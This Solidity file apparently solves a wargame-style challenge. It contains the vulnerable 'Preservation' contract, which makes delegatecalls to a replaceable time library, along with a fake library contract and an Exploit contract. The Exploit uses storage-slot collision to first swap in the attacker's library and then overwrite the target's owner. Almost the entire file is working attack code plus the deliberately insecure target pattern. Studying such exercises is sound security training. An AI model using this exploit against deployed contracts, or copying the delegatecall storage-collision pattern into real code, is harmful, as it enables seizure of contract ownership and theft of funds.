// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract FakeLibraryContract {
  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}

contract Exploit is Destructible, Targeted {

  FakeLibraryContract attacker;

  constructor(address target_addr) payable Targeted(target_addr) {
    attacker = new FakeLibraryContract();
  }

  function exploit() public payable {
    Preservation preservation = Preservation(Targeted(this).target());

    preservation.setFirstTime(uint(uint160(address(attacker))));
    require(address(attacker) == preservation.timeZone1Library(), "timeZone1Library not set");
    preservation.setFirstTime(uint(uint160(Destructible(this).owner())));
    require(Destructible(this).owner() == preservation.owner(), "owner not set");
  }
  receive() external payable {
  }
}